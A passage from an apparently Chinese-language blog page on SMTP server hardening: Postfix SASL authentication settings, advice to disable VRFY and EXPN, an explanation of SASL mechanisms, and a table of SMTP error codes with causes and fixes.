href="mailto:&#x68;&#x61;&#x63;&#x6b;&#64;&#x68;&#x61;&#x63;&#107;&#x2e;&#99;&#x6f;&#x6d;">&#x68;&#x61;&#x63;&#x6b;&#64;&#x68;&#x61;&#x63;&#107;&#x2e;&#99;&#x6f;&#x6d;</a></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">smtpd_sasl_auth_enable = yes<br><span class="hljs-meta">#</span><span class="bash">指定postfix使用sasl验证 通俗的将就是启用smtp并要求进行账号、密码效验</span><br><br>smtpd_sasl_local_domain = $mydomain<br><span class="hljs-meta">#</span><span class="bash">指定SMTP认证的本地域名 本次配置可以使用 smtpd_sasl_local_domain = <span class="hljs-string">&#x27;&#x27;</span> 或干脆注释掉 默认为空</span><br><br>smtpd_sasl_security_options = noanonymous<br><span class="hljs-meta">#</span><span class="bash">取消smtp的匿名登录 此项默认值为noanonymous smtp若能匿名登录危害非常大 此项请务必指定为noanonymous</span><br></code></pre></td></tr></table></figure><h3 id="枚举服务器邮箱地址"><a href="#枚举服务器邮箱地址" class="headerlink" title="枚举服务器邮箱地址"></a>枚举服务器邮箱地址</h3><p>禁用VRFY和EXPN，通过VRFY和EXPN可以枚举服务器邮箱地址</p><h3 id="SASL-简单认证和安全层"><a href="#SASL-简单认证和安全层" class="headerlink" title="SASL - 简单认证和安全层"></a>SASL - 简单认证和安全层</h3><pre><code>     SASL是一种用来扩充C/S模式验证能力的机制认证机制,  全称Simple Authentication and Security Layer.</code></pre><p> 当你设定sasl时，你必须决定两件事；一是用于交换“标识信 息”（或称身份证书）的验证机制；一是决定标识信息存储方法的验证架构。</p><p> sasl验证机制规范client与server之间的应答过程以及传输内容的编码方法，sasl验证架构决定服务器本身如何存储客户端的身份证书以及如何核验客户端提供的密码。</p><p> 如果客户端能成功通过验证，服务器端就能确定用户的身份， 并借此决定用户具有怎样的权限。</p><p> 比较常见的机制；</p><p>4.1 plain(较常用)</p><pre><code>       plain是最简单的机制，但同时也是最危险的机制，因为身份证书（登录名称与密码）是以base64字符串格式通过网络，没有任何加密保护措施。因此，使用plain机制时，你可能会想要结合tls。</code></pre><p>4.2 login</p><pre><code>       login不是其正式支持的机制，但某些旧版的mua使用这种机制，所以cyrus sasl让你可选择其是否支持login机制。如果你的用户仍在使用这类老掉牙的mua，你必须在编译sasl函数库时，指定要包含login的支持。 login的证书交换过程类似plain。</code></pre><p>4.3 otp</p><pre><code>    otp是一种使用“单次密码”的验证机制。此机制不提供任何加密保护，因为没必要－－每个密码都只能使用一次，每次联机都要改用新密码。smto client必须能够产生otp证书。</code></pre><p>4.4 digest-md5(较常用)</p><pre><code>       使用这种机制时，client与server共享同一个隐性密码，而且此密码不通过网络传输。验证过程是从服务器        先    提出challenge（质询）开始， 客户端使用此challenge与隐性密码计算出一个response（应答）。不同        的    challenge，不可能计算出相同的response；任何拥 有secret password的一方，都可以用相同的              challenge算出相同的response。因此，服务器只要比较客户端返回的response是否与自己算 出的response相    同，就可以知道客户端所拥有的密码是否正确。由于真正的密码并没有通过网络，所以不怕网络监测。</code></pre><p>4.5 kerberos</p><pre><code>    kerberos是一种网络型验证协议。除非你的网络已经使用kerberos，否则你应该用不到kerberos机制；相对        的，如果你的网络已经架设了kerberos验证中心，sasl就能完美的将smtp验证整合进现有的体系。</code></pre><p>4.6 anonymous</p><pre><code>   anonymous机制对smtp没有意义，因为smtp验证的用意在于限制转发服务的使用对象，而不是为了形成        open relay，sasl之所以提供这种机制，主要是为了支持其他协议。       当 客户端链接到一个支持sasl的邮件服务器时，服务器会以优先级列出可用的机制供客户端选择。如果客户        端也支持多钟机制，则当第一种机制验证失败时，客户 端可能会继续尝试第二种机制，直到通过验证或是所        有    机    制都失败为止。如果双方在一开始就无法协调出共同的机制，验证过程就算失败。       一旦双方在使用哪种机制上达成共识，就开始进行验证过程。实际的交互过程随机制而定，但通常包含一次        或多次应答过程。验证协议本身也规定了应答内容的编码格式。</code></pre><ol start="5"><li><p>总结 </p><p>  数字证书, 是级联认证派发的, 最上层是根CA认证中心. 数字证书的根本作用, 是为了保证所有人公钥的安全性和真实性. 大致认证过程是: 通过CA的公钥来解出该CA所派发的证书里面所包含的公钥(用户或者机构的). 并通过该公钥来验证证书持有人的真实性. (因为持有人并不一定是证书所有人)</p><p>  通过上面对SSL的分析，我们可以看到，SSL并不能阻止别人获得你传输的数据，但是由于你传输的数据都是加 密过的，别人拿到了毫无用处，一样可以保护信 息的安全。还有一点需要强调一下，SSL并不依赖于TCP，它可以 建立在任何可靠的传输层协议（比如TCP）之上。也就是说SSL是不能建立在UDP之上 的。这是显然的，如果传输都不可靠，偶尔丢两个包或者包的顺序换一换的话，怎么保证安全呢？<br>   SASL是提供一种用户身份认证机制, 你可以简单认为是用来认证用户的账号/密码是否运行进入系统或者使用系统的服务. 一般较长使用digest-md5, 该种机制下, 密码可以不用在网络上传输, 也就不用怕密码被窃听.</p></li></ol><h2 id="SMTP错误码"><a href="#SMTP错误码" class="headerlink" title="SMTP错误码"></a>SMTP错误码</h2><table><thead><tr><th>420</th><th>1. Timeout Communication Problem Encountered During Transmission. Thie Is a Novell Groupwise Smtp Error 2. Tcp Read Error 3. Tcp Write Error</th><th>在联机时发生通讯中断的问题；Novell GroupWise SMTP服务器的错误讯息</th></tr></thead><tbody><tr><td>此错误讯息只适用于Novell GroupWise SMTP服务器，在此不多做赘述。</td><td>N/A</td><td></td></tr><tr><td>421</td><td>1. Service Not Available, Closing Transmission Channel [this May Be a Reply To Any Command If the Service Knows It Must Shut Down] 2. Service Not Available - the Sending Email Program Should Try Again Later</td><td>括号内的主机无法提供正常的邮件服务，关闭传送管道，邮件将滞留在主机上</td></tr><tr><td>收信者端邮件服务器暂时无法上线。</td><td>请收信者和邮件管理者确认收信端邮件服务器是否正常作业，通常是由于邮递员停机做问题的检测或是邮件服务器正在重开机中又或是服务器正在同时间处理大量的新进邮件或新进要求。这类情形不会持续太久，若能晚点在尝试发送，也许问题已经解决。请注意的是：这里指的邮件服务器可能是邮件发送途中的任何一台邮件服务器。若是这种情形发生的太过于频繁，则需要与邮递员讨论。</td><td></td></tr><tr><td>421</td><td>1. the Smtp Service/server You Use Has a Limit On the Number of Concurrent Smtp Streams Your Server Can Use 2. Too Many Concurrent Smtp Connections From This Ip Address; Please Try Again Later</td><td>收件者 SMTP 主机拒绝提供服务，因为已经超过其能提供的最大服务量</td></tr><tr><td>SMTP 主机最大联机数量已达</td><td>稍后再试</td><td></td></tr><tr><td>422</td><td>The Recipient’s Mailbox Is Over Its Storage Limit</td><td>收信者邮件信箱的信件已经超过允许的最大容量</td></tr><tr><td>可能收信者信箱被塞满</td><td>1. 请收信者整理邮件信箱 2. 请收信者通知邮递员加大信箱空间</td><td></td></tr><tr><td>422</td><td>The Size of the Message Exceeds the Recipient’s Size Limits For Incoming Emails</td><td>邮件大小超过收信端邮件信箱的单次收信大小</td></tr><tr><td>邮件大小超过收信端邮件信箱的单次收信大小。</td><td>1. 请收信者通知邮递员加大单次收信大小； 2. 收信者通知发件人分次寄送过大信件的内容。</td><td></td></tr><tr><td>431</td><td>The Recipient’s Mail Server Is Experiencing a Disk Full Condition</td><td>收信端的邮件服务器磁盘空间已满</td></tr><tr><td>收信端的邮件服务器磁盘空间已满</td><td>请收信者通知邮递员清出可用空间以供使用</td><td></td></tr><tr><td>432</td><td>The Recipient’s Exchange Server Incoming Mail Queue Has Been Stopped</td><td>收信者的 Exchange Server 的新进信件处理程序已经停止</td></tr><tr><td>通常是Exchange Server 管理者正在处理一些问题。</td><td>请收信者通知邮递员处理。</td><td></td></tr><tr><td>441</td><td>The Recipient’s Server Is Not Responding</td><td>收信端的邮件服务器没有回应</td></tr><tr><td>收件端邮件服务器没有反应，可能正在维护中</td><td>寄信端邮件服务器会再次或多次尝试寄送，您无需担心</td><td></td></tr><tr><td>442</td><td>The Connection Was Dropped During Transmission</td><td>传送邮件的过程中联机中断</td></tr><tr><td>传送的过程中联机中断</td><td>1. 检查邮件是否带有病毒附件 2. 当然病毒或是黑客的可能性也不容忽视。</td><td></td></tr><tr><td>446</td><td>The Maximum Hop Count Was Exceeded For the Message</td><td>邮件传送时经过的服务器跃点数已经超过最大值</td></tr><tr><td>邮件可能在内部网络中的两台服务器中被转来转去以致于超过最大跃点数；也有可能是邮件在发信端与收信端的邮件服务器之间来回跳跃，而造成超过最大跃点数</td><td>请与ISP联络检查网络问题</td><td></td></tr><tr><td>449</td><td>Routing Error</td><td>路由错误</td></tr><tr><td>此错误讯息只适用于Microsoft Exchange Server，在此不多做赘述。</td><td>通知收件者网络管理员</td><td></td></tr><tr><td>450</td><td>Requested Mail Action Not Taken - the Mailbox Was Unavailable at the Remote End</td><td>所要求的邮件动作无法执行：收信端无此账户</td></tr><tr><td>收信端无此账户</td><td>检查是否拼错字</td><td></td></tr><tr><td>450</td><td>Please Try Again Later</td><td>请在尝试一次</td></tr><tr><td>通常发生在对方启用灰名单防垃圾信机制的缘故</td><td>无需理会，让服务器自动重寄</td><td></td></tr><tr><td>450</td><td>Host Down</td><td>邮件服务器不在在线</td></tr><tr><td>收信端邮件主机故障</td><td>稍后再重寄</td><td></td></tr><tr><td>450 5.2.3</td><td>Msg Size Greater Than Allowed By Remote Host</td><td>邮件大小超过收信端的上限</td></tr><tr><td>邮件大小超过收信端的上限</td><td>1. 请缩小单笔邮件的大小，可将一封邮件切为多封邮件来传送 2. 请收信端邮递员将收信上限提高 3. 若是还是无法寄送，可以考虑使用FTP的传输方式来传送</td><td></td></tr><tr><td>451</td><td>Requested Action Aborted: Local Error in Processing</td><td>要求动作中断：在本地处理邮件时产生错误</td></tr><tr><td>原因1：收信端 SMTP 软件可能已经当机</td><td>请寄信者针对此问题通知对方网络管理员</td><td></td></tr><tr><td>451</td><td>(x.x.x.x) Has Recently Sent Spam</td><td>(x.x.x.x) 被认定近期常发送垃圾信</td></tr><tr><td>IP地址可能落在垃圾信IP数据库内</td><td>请邮递员检验相关垃圾信来源的数据库</td><td></td></tr><tr><td>451</td><td>Requested Action Delayed – Local Problem</td><td>传输延迟：指令被延迟，本地的错误</td></tr><tr><td>此问题表示收件者邮件服务器故障</td><td>稍后在试或通知收件者网络管理员</td><td></td></tr><tr><td>451</td><td>Unable To Complete Command, Dns Not Available Or Timed Out</td><td>无法完成指令，DNS系统无法提供服务导致服务停摆</td></tr><tr><td>DNS解析的问题</td><td>收信端邮件服务器主机无法解析DNS，请稍后在试</td><td></td></tr><tr><td>451</td><td>Domain of Sender Address Does Not Resolve</td><td>无法解析发信者的邮件地址</td></tr><tr><td>DNS解析的问题</td><td>请检查寄信端邮件服务器网络卡设定以及确认该DNS服务器是否正常工作;</td><td></td></tr><tr><td>451</td><td>Max Smtp Services Exceeded, Please Try Again Later</td><td>已超过最高的SMTP联机数，请稍后再试</td></tr><tr><td>SMTP服务太过繁忙；可能被当垃圾信跳板服务器。</td><td>1. 提高最高SMTP联机数并且稍后再试 2. 关闭 Open Relay 3. 开启 SMTP AUTH 身份认证</td><td></td></tr><tr><td>451</td><td>Read Error From Mail.mail.xxx.xxx.xxx</td><td>读取错误自&lt;邮件服务器&gt;</td></tr><tr><td>可能是DNS指向设定错误。</td><td>1. 请检查DNS是否正常运作</td><td></td></tr><tr><td>451 4.1.8</td><td>Domain of Sender Address <a href="mailto:&#x58;&#x78;&#x78;&#64;&#x78;&#120;&#120;&#46;&#x78;&#x78;&#x78;">&#x58;&#x78;&#x78;&#64;&#x78;&#120;&#120;&#46;&#x78;&#x78;&#x78;</a> Does Not Resolve</td><td>无法解析送信者邮件信箱所属的网域</td></tr><tr><td>DNS的问题比如需要做DNS反解。</td><td>通知邮递员并检查DNS设定是否正常。</td><td></td></tr><tr><td>451 4.7.1</td><td>Greylisting in Action, Please Come Back in 00:02:00 [minutes]</td><td>灰色名单功能运行中，请在两分钟后再寄一次邮件</td></tr><tr><td>灰色名单功能运行中</td><td>请在两分钟后再寄一次邮件（服务器会自动重寄）</td><td></td></tr><tr><td>452</td><td>Requested Action Not Taken: Insufficient System Storage</td><td>要求动作无法执行：系统空间不足</td></tr><tr><td>收件者邮件服务器硬盘可能已满</td><td>解决办法是等一段时间之后再行寄，或者通知收信者网络管理员</td><td></td></tr><tr><td>452</td><td>Too Many Recipients</td><td>在单次待发邮件中有过多收信者邮件账号</td></tr><tr><td>此问题可能发生在寄信端ISP、收信端ISP或甚至是发信端邮件服务器：由于一些其他的问题发生导致所有使用者无法发信件，当问题修复完成时的那一瞬间，所有的信件一下子蜂拥而至塞满服务器的储存空间甚至也塞满系统内存的资源，此错误讯息就会发生。</td><td>1. 解决办法是等一段时间之后，等尖峰期过后再行寄送。</td><td></td></tr><tr><td>452</td><td>Out of Memory</td><td>内存不足</td></tr><tr><td>此问题可能发生在寄信端ISP、收信端ISP或甚至是发信端邮件服务器：由于一些其他的问题发生导致所有使用者无法发信件，当问题修复完成时的那一瞬间，所有的信件一下子蜂拥而至塞满服务器的储存空间甚至也塞满系统内存的资源，此错误讯息就会发生。</td><td>1. 解决办法是等一段时间之后，等尖峰期过后再行寄送。</td><td></td></tr><tr><td>465</td><td>Invalid Response Code Received From Server</td><td>自服务器接收到无效的认证回应</td></tr><tr><td>自2010年开始，osTicket或是其他的邮件服务器开始使用此错误代码，若是认证设定有错误时，收信者的邮件服务器会回应此错误代码。</td><td>1. 请收信者联络邮递员解决认证设定上的修正。</td><td></td></tr><tr><td>471</td><td>This Is a Local Error With the Sending Server And Is Often Followed With “please Try Again Later”</td><td>发信端的邮件服务器自身发生错误时，时常会回报请稍候再试</td></tr><tr><td>此错误码471或4.7.1经常被当作一般SMTP错误码的附带码比如：451 4.7.1。 原因一：有此附带码的错误通常都和寄信端邮件服务器上的反垃圾信机制或是防病毒软件有关连。并且是由这类程序内的程序瑕疵或程序自动更新机制所造成。 原因二：内存不足或硬盘上的数据损毁等等硬件上的问题。</td><td>原因1： 1. 与软件商联络咨询有无解法； 2. 若这些软件并非专门的邮件服务器版本时，将邮件扫瞄的功能关闭。 原因2： 1. 与邮递员联系并做硬件除错。</td><td></td></tr><tr><td>500</td><td>Syntax Error, Command Not Recognized [this May Include Errors Such As Command Line Too Long]</td><td>语法错误，无法辨识的指令</td></tr><tr><td>原因：1. 最后一个从发信端邮件服务器发出的SMTP或ESMTP指令无法为收件者的服务器所辨识。 原因2. 或是指令的格式不符合对方服务器的要求，此间包含指令字符串太长 上述两个原因通常是防病毒软件或是防火墙程序对于SMTP进或出的端口造成影响。</td><td>可能有防火墙软硬件阻挡了一些新型态的 SMTP 指令，可关闭防火墙或防病毒软件进行测试</td><td></td></tr><tr><td>500</td><td>Line Too Long</td><td>指令太长，无法辨识</td></tr><tr><td>指令的格式不符合对方服务器的要求，此间包含指令字符串太长。</td><td>请参考防病毒软件或是防火墙程序的使用手册上和SMTP相关的对应设定。</td><td></td></tr><tr><td>500</td><td>Access Denied By Port Access</td><td>端口存取被拒</td></tr><tr><td>指令的格式不符合对方服务器的要求，此间包含指令字符串太长。</td><td>请参考防病毒软件或是防火墙程序的使用手册上和SMTP相关的对应设定。</td><td></td></tr><tr><td>500</td><td>Unrecognized Command</td><td>无法辨识的指令</td></tr><tr><td>最后一个从发信端邮件服务器发出的SMTP或ESMTP指令无法为收件者的服务器所辨识。</td><td>请参考防病毒软件或是防火墙程序的使用手册上和SMTP相关的对应设定。</td><td></td></tr><tr><td>501</td><td>Can Sometimes Also Be Indicative of Communication Problems</td><td>有时可能是网络线路的问题</td></tr><tr><td>网络线路的问题。</td><td>请在command prompt底下键入ping 168.95.1.1还有ping其他响应快速的网站比如<a href="http://www.microsoft.com以及www.hinet.net等等来测试网络是否顺畅.若出现响应时间太慢或是有断讯的现象,请向网络管理员反映./">www.microsoft.com以及www.hinet.net等等来测试网络是否顺畅。若出现响应时间太慢或是有断讯的现象，请向网络管理员反映。</a></td><td></td></tr><tr><td>501</td><td>Sender Email Is Not in My Domain</td><td>发信者账号不在发信者所属网域</td></tr><tr><td>笔误</td><td>请确认发件人账号无误</td><td></td></tr><tr><td>501</td><td>Recipient Is Not Verified</td><td>无法确认收信者的邮件账号</td></tr><tr><td>收信者的邮件账号可能输入错误。</td><td>请与对方确认邮件账号。</td><td></td></tr><tr><td>501</td><td>Sender Domain Must Exist</td><td>发信者的网域必须存在</td></tr><tr><td>原因1：DNS的问题 原因2：发件人邮件地址域名可能输入错误</td><td>原因1： 请确认DNS设定没问题 原因2： 请确认邮件账号中的域名是正确的</td><td></td></tr><tr><td>501</td><td>Syntax Error in Parameters Or Arguments</td><td>系统指令的参数错误</td></tr><tr><td>系统指令的参数错误</td><td>1. 请确认.信箱账号无误 2. 网域名无误 3. Linux/Unix 的SEND MAIL 指令依照标准语法</td><td></td></tr><tr><td>501</td><td>Path Too Long</td><td>系统指令的参数错误</td></tr><tr><td>系统指令的参数错误。</td><td>请确认指令参数符合标准</td><td></td></tr><tr><td>501</td><td>Syntax Helo Hostname</td><td>语法: HELO hostname</td></tr><tr><td>收信者邮件服务器要求发件人邮件服务器发送正确的指令语法</td><td>使用 EVO Mail Server 应不致于有这款问题</td><td></td></tr><tr><td>501</td><td>Invalid Domain Name</td><td>无效的域名</td></tr><tr><td>无效的域名。</td><td>请确认域名无误。</td><td></td></tr><tr><td>501 5.1.3</td><td>Invalid Address</td><td>无效的邮件地址</td></tr><tr><td>无效的邮件地址。</td><td>请确认邮件地址无误。</td><td></td></tr><tr><td>501 5.1.3</td><td>Bad Recipient Address Syntax</td><td>收信者邮件账号语法错误</td></tr><tr><td>收信端邮件账号语法错误。</td><td>请确认邮件地址无误。</td><td></td></tr><tr><td>501 5.5.4</td><td>Invalid Address</td><td>不合法的IP地址</td></tr><tr><td>若收信端邮件服务器是MS Exchange Server 5.5， 2000， 2003而收到此错误讯息时，</td><td>请与收信端邮递员联络并附上<a href="http://support.microsoft.com/kb/291828.%E5%B0%86Exchange">http://support.microsoft.com/kb/291828.将Exchange</a> Server予以修正。</td><td></td></tr><tr><td>502</td><td>1. Unimplemented Command 2. Command Not Implemented</td><td>SMTP指令的语法错误，原因不明</td></tr><tr><td>收件者邮件服务器主机不支持某些基本的 SMTP 指令</td><td>联系对方邮递员并建议它更新软件</td><td></td></tr><tr><td>503</td><td>1. Polite People Say Helo First 2. Error: Need Mail Command 3. Need Mail Before Rcpt 4. Bad Sequence of Commands</td><td>SMTP指令顺序出错，一般出现在其他错误之后，先检查之前出现的错误提示</td></tr><tr><td>这类问题通常是寄件用 SMTP 软件设计不良或是防火墙造成</td><td>替 SMTP 软件更新版本并检查防火墙是否有阻止某些指令</td><td></td></tr><tr><td>503</td><td>This Mail Server Requires Authentication When Attempting To Send To a Non-local E-mail Address. Please Check Your Mail Client Settings Or Contact Your Administrator To Verify That the Domain Or Address Is Defined For This Server</td><td>邮件服务器需要身份认证，请检查收信软件中的设定</td></tr><tr><td>寄信者若没有经过身份认证将无法对网域外的收信者发信</td><td>请在Outlook里的「我的 SMTP 服务器需要验证」打勾来启动 SMTP Auth 的功能</td><td></td></tr><tr><td>503</td><td>No Recipients Specified</td><td>没有指定收信者</td></tr><tr><td>收信者字段若没有指定邮件账号，信件无法寄出</td><td>请在收信者字段输入收信者电子邮件账号</td><td></td></tr><tr><td>504</td><td>1. Command Parameter Not Implemented 2. Need To Authenticate First</td><td>1. 此SMTP指令没有内建此参数 2. 登入之前需要认证</td></tr><tr><td>在邮件服务器内，此指令无设此参数而造成验证失败</td><td>请收信者洽邮递员</td><td></td></tr><tr><td>505</td><td>Client Was Not Authenticated</td><td>客户端没有经过认证无法登入</td></tr><tr><td>在Outlook或是Outlook Express里使用gmail或是yahoo信箱的Smtp服务器时，若没有设定好一些选项，会出现此项错误讯息。</td><td>1. 要用雅虎或GMAIL的邮箱发信； 2. 要加入身份验证； 3. 要在「个人信息」中填写正确邮箱地址； 4. 要点选「SMTP服务器需要认证」。</td><td></td></tr><tr><td>510</td><td>Bad Email Address</td><td>无效的电子邮件账号</td></tr><tr><td>此错误讯息发自寄信端邮件服务器。若是TO， CC， BCC的收信者位在网域内，表示这些收信者不存在；若是收信者是收信者邮件账号是网外账号，表示这些账号可能笔误。</td><td>请确认收件端账号是否正确。</td><td></td></tr><tr><td>511</td><td>1. Bad Email Address 2. Sorry, Recipient Address Has Invalid Format</td><td>1. 无效的邮件账号 2. 收件者信箱格式错误</td></tr><tr><td>表示这些收件者电子邮件地址可能有笔误</td><td>请确认收件端账号是否正确</td><td></td></tr><tr><td>512</td><td>The Host Server For the Recipient’s Domain Name Cannot Be Found (dns Error)</td><td>找不到负责收信者邮件账号的邮件服务器主机</td></tr><tr><td>若是一切都正确，则有可能是DNS服务器上的解析纪录有问题，通常是负责本身邮件服务器的DNS服务器或是所属ISP的DNS服务器无法正确解析。</td><td>请逐一检查所有收信端邮件地址的网域名是否正确。</td><td></td></tr><tr><td>512</td><td>Bad Destination Host ‘dns Hard Error Looking Up Domain</td><td>DNS系统中找不到这收信者的网域名</td></tr><tr><td>主要是DNS系统无法解析</td><td>请逐一检查所有收信端邮件地址的网域名是否正确。</td><td></td></tr><tr><td>512</td><td>The Message Could Not Be Delivered Because the Recipient’s Destination Email System Is Unknown Or Invalid. Please Check the Address And Try Again, Or Contact Your System Administrator To Verify Connectivity To the Email System of the Recipient</td><td>收信者的邮件服务器或是邮件信箱账号可能出现问题以致于无法传递信件，请洽网络管理员以确认收信者的邮件系统是否正常</td></tr><tr><td>若是一切都正确，则有可能是DNS服务器上的解析纪录有问题，通常是负责本身邮件服务器的DNS服务器或是所属ISP的DNS服务器无法正确解析。</td><td>可通知邮递员加以确认。</td><td></td></tr><tr><td>512</td><td>Conditions are Caused By Misspellings of the Domain Name Part of a Recipient Email Address</td><td>收信者邮件地指的网域部分可能有错误，以致于出现此问题</td></tr><tr><td>主要是DNS系统无法解析邮件里TO，CC，BCC中信箱地址的网域名。</td><td>请逐一检查所有收信端邮件地址的网域名是否正确。</td><td></td></tr><tr><td>513</td><td>Relaying Denied Or Authentication Required (a Small Percentage of Mail Servers)</td><td>邮件寄送被拒或是需要验证（一小部分的邮件服务器有此规范）</td></tr><tr><td>小部分的邮件服务器需要寄信者在寄信之前做身份的验证。</td><td>请邮件服务器管理员确认认证步骤并在邮件程序里设定好安全验证的步骤</td><td></td></tr><tr><td>523</td><td>The Recipient’s Mailbox Cannot Receive Messages This Big</td><td>由于信箱大小的上限，收信者的邮件信箱无法接收此邮件</td></tr><tr><td>收信者的信箱大小受到限制。</td><td>1. 请缩小单笔邮件的大小，可将一封邮件切为多封邮件来传送 2.请收信端邮递员将收信上限提高 3. 若是还是无法寄送，可以考虑使用FTP的传输方式来传送</td><td></td></tr><tr><td>530</td><td>Authentication Is Required</td><td>寄送之前，请做身份认证</td></tr><tr><td>寄件端邮件服务器设定了一个寄信前必须做身份认证的机制。但是在邮件客户端程序比如Outlook里头您没有勾选输入认证数据的设定。</td><td>1. 请在Outlook里的「我的服务器需要验证」打勾来启动SMTP AUTH的功能。</td><td></td></tr><tr><td>530</td><td>1. Your Server Has Been Blacklisted By the Recipient’s Server 2. the Recipient’s Mailbox Does Not Exist 3. the Message Cannot Be Delivered Due To a Configuration Error On the Server. Please Contact Your Administrator</td><td>1. 发件人的邮件服务器已经被置入收信者的黑名单之中 2. 收信者的信箱不存在 3. 由于邮件服务器上的设定错误造成您无法寄送信件，请联络您的网络管理员</td></tr><tr><td>当出现这三种错误讯息时，寄件端邮件服务器已经被置入收信者的黑名单之中或是收信端信箱不存在。</td><td>请联络收信者确认邮件地址或是请收信者联络邮递员将寄信者或是寄信端邮件服务器从黑名单中剔除。</td><td></td></tr><tr><td>530 5.7.0</td><td>Must Issue a Starttls Command First</td><td>在开始寄信前，必须下一个STARTTLS的指令</td></tr><tr><td>这错误讯息是您使用GMAIL时，若是没有输入身份验证的话，也有类似530 Authentication is required的错误讯息。</td><td>请寄信者输入认证数据。</td><td></td></tr><tr><td>535</td><td>1. Error: Authentication Failed 2. Authentication Unsuccessful</td><td>1. 错误讯息：验证失败 2. 验证不成功</td></tr><tr><td>寄信端邮件服务器为了要防止垃圾信做出传递邮件的限制。</td><td>可请邮递员设定SMTP AUTH的认证或是限定某个IP地址才可寄信的方式。</td><td></td></tr><tr><td>541</td><td>1. No Answer From Host 2. Recipient Address Rejected - Access Denied (typically By the Recipient’s Antispam Program / Appliance</td><td>1. 收信者端没有回应 2. 收信者端拒绝收信（通常是收信者端的反垃圾信程序造成的问题）</td></tr><tr><td>1. 收件者主机无响应 2. 收件者地址被拒</td><td>请收信者通知网络管理者将寄信者加入白名单</td><td></td></tr><tr><td>544</td><td>Recipient Address Rejected: Relay Access Denied</td><td>收信者邮件信箱被拒绝：传递邮件遭拒</td></tr><tr><td>寄信端邮件服务器为了要防止垃圾信做出传递邮件的限制</td><td>请在Outlook里的「我的 SMTP 服务器需要验证」打勾来启动 SMTP Auth 的功能 设定 SMTP AUTH 的认证通过后再寄信，或是限定某个IP地址才可寄信的方式。</td><td></td></tr><tr><td>550</td><td>Unable To Relay For …</td><td>此信件无法传递</td></tr><tr><td>DNS指向设定错误造成无法解析收信端邮件服务器。</td><td>请邮递员检测DNS是否正常。</td><td></td></tr><tr><td>550</td><td>Mailbox (<a href="mailto:&#120;&#x78;&#120;&#64;&#x78;&#120;&#x78;&#x2e;&#x78;&#x78;">&#120;&#x78;&#120;&#64;&#x78;&#120;&#x78;&#x2e;&#x78;&#x78;</a>) Not Found Or Inactivated</td><td>信箱不存在或没被启用</td></tr><tr><td>信箱不存在或没被启用。</td><td>检查账号信箱是否已被删除或尚未启用</td><td></td></tr><tr><td>550</td><td>…relaying Denied</td><td>电子邮件传递遭到拒绝</td></tr><tr><td>寄信端邮件账号或是IP地址可能被收信端邮件服务器放入黑名单中。</td><td>请与收信者通知邮递员将寄信者的IP地址或是寄信端邮件服务器IP地址从黑名单移除。</td><td></td></tr><tr><td>550</td><td>1. Requested Actions Not Taken As the Mailbox Is Unavailable 2. Not Our Customer 3. Invalid Recipient 4. No Such User Here 5. <a href="mailto:&#66;&#x61;&#x72;&#97;&#x63;&#x6b;&#x2e;&#111;&#98;&#x61;&#x6d;&#x61;&#64;&#x74;&#104;&#x69;&#x73;&#x63;&#111;&#x6d;&#x70;&#97;&#x6e;&#121;&#46;&#x63;&#111;&#x6d;">&#66;&#x61;&#x72;&#97;&#x63;&#x6b;&#x2e;&#111;&#98;&#x61;&#x6d;&#x61;&#64;&#x74;&#104;&#x69;&#x73;&#x63;&#111;&#x6d;&#x70;&#97;&#x6e;&#121;&#46;&#x63;&#111;&#x6d;</a>, This Thiscompany.com Mailbox Does Not Exist – Giving Up 6. Account Not Available 7. Address Rejected 8. User Account Is Unavailable</td><td>1. 所要求动作无法执行，信箱不存在 2. 不是我们的客户 3. 无效的收信者账号 4. 这里没有这个账号 5. THISCOMPANY.COM 这个账号不存在，放弃吧！ 6. 无此账号 7. 邮件地址被拒 8. 无此用户账号</td></tr><tr><td>收件端邮件账号不存在、停用或被删除。</td><td>发件人需向收信者确认正确的邮件地址</td><td></td></tr><tr><td>550</td><td>1. 550 Verification Failed For <a href="mailto:&#x58;&#120;&#120;&#64;&#120;&#120;&#120;&#x2e;&#x78;&#x78;&#120;">&#x58;&#120;&#120;&#64;&#120;&#120;&#120;&#x2e;&#x78;&#x78;&#120;</a> 2. Previous (cached) Callout Verification Failure 3. Sender Verify Failed</td><td>1. 此账号 <a href="mailto:&#x78;&#x78;&#120;&#64;&#120;&#120;&#x78;&#x2e;&#120;&#120;&#x78;">&#x78;&#x78;&#120;&#64;&#120;&#120;&#x78;&#x2e;&#120;&#120;&#x78;</a> 的身份核对失败 2. 前次存在快取里的身份核对失败 3. 寄信者的身份核对失败</td></tr><tr><td>通常意指寄信者已经被反垃圾信机制或是防火墙列入黑名单</td><td>请收信者向邮递员反映，并把寄信者白名单化，并检查 spf 设定</td><td></td></tr><tr><td>550</td><td>Cyberoam Anti Spam Engine Has Identified This Email As a Spam. Refid:str=0001.0a0b0206.4ba7422c.01f5,ss=1,vtr=str,vl=0,pt =</td><td>反垃圾信机制侦测并怀疑此信件为垃圾信</td></tr><tr><td>通常发生在寄信端的防火墙或反垃圾信机制怀疑此封邮件可能是垃圾信因此阻挡下来。以防止垃圾信件流传到收件者端。</td><td>请网络管理者对此信件放行。</td><td></td></tr><tr><td>550</td><td>Recipients’ Mailbox Not Local And Mail Relay Is Not Enabled</td><td>收信者的邮件信箱非本地信箱且无法做邮件转寄的动作</td></tr><tr><td>寄信端邮件信箱和收信端邮件信箱不在同一网域内，无法寄信。</td><td>寄信者请与网络管理员联系作适当的调整</td><td></td></tr><tr><td>550</td><td>The Sending Address Is Invalid</td><td>寄信者的邮件地址无效</td></tr><tr><td>寄信端邮件服务器的MX记录设定有误造成收件端的DNS系统无法解析寄件端的邮件地址，</td><td>寄信者通知邮递员做检测并做修正。</td><td></td></tr><tr><td>550</td><td>Recipients Outside of Your Domain Where This Is Not Allowed</td><td>寄信者邮件信箱和收信者邮件信箱不在同一网域内，无法寄信</td></tr><tr><td>寄信者邮件信箱和收件者邮件信箱不在同一网域内，无法寄信。</td><td>寄信者请与邮递员联系作适当的调整。</td><td></td></tr><tr><td>550</td><td>Smtp Authentication Required</td><td>需要做SMTP身份认证来进行寄信的动作</td></tr><tr><td>在Outlook或是Outlook Express里，SMTP 